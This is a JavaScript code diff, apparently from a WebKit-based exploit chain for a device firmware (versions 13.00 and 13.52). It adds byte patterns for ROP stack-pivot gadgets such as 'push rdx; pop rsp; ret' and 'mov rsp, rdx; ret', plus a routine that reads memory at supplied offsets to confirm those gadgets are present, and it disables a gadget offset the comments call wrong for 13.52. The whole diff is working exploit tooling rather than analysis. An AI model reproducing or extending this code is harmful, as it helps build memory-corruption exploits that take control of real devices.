@@ -28,6 +28,8 @@ export const PIVOT_HW_1352 = {
 
 export function pivotHint(key) {
     if (PIVOT_HW_1352[key] != null) return PIVOT_HW_1352[key];
+    /** G5 13.00 hint (+0x2abccaa) is wrong and OOMs on 13.52 — never use */
+    if (key === "wk_PUSH_RDX_POP_RSP_RET") return 0;
     return PIVOT_HINTS_1300[key] || 0;
 }
 
@@ -60,6 +62,22 @@ export const PIVOT_ROWS = [
     ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
 ];
 
+/** G5 accepts any stack-pivot-from-rdx gadget (13.52 may differ from 13.00 push/pop) */
+export const G5_PATTERNS = [
+    { pat: [0x52, 0x5c, 0xc3], kind: "push rdx; pop rsp; ret" },
+    { pat: [0x41, 0x52, 0x5c, 0xc3], kind: "rex push rdx; pop rsp; ret" },
+    { pat: [0x48, 0x89, 0xd4, 0xc3], kind: "mov rsp, rdx; ret" },
+];
+
+export function checkG5Bytes(read1, base, rva) {
+    if (rva == null || !base) return null;
+    for (let i = 0; i < G5_PATTERNS.length; i++) {
+        const g = G5_PATTERNS[i];
+        if (checkPivotBytes(read1, base, rva, g.pat)) return g;
+    }
+    return null;
+}
+
 export const PIVOT_KEYS = PIVOT_ROWS.map(r => r[1]);
 
 export function pivotPattern(row, off) {
@@ -87,17 +105,24 @@ export function verifyPivotSet(read1, base, off) {
     const missing = [];
     for (let i = 0; i < PIVOT_ROWS.length; i++) {
         const row = PIVOT_ROWS[i];
+        const label = row[0];
         const key = row[1];
         const rva = off[key];
         const pat = pivotPattern(row, off);
         if (rva == null) {
-            missing.push(row[0]);
+            missing.push(label);
+            continue;
+        }
+        if (label === "G5") {
+            const g = checkG5Bytes(read1, base, rva);
+            if (g) good.push(label + " (" + g.kind + ")");
+            else bad.push(label);
             continue;
         }
         if (checkPivotBytes(read1, base, rva, pat))
-            good.push(row[0]);
+            good.push(label);
         else
-            bad.push(row[0]);
+            bad.push(label);
     }
     return {
         ok: bad.length === 0 && missing.length === 0,
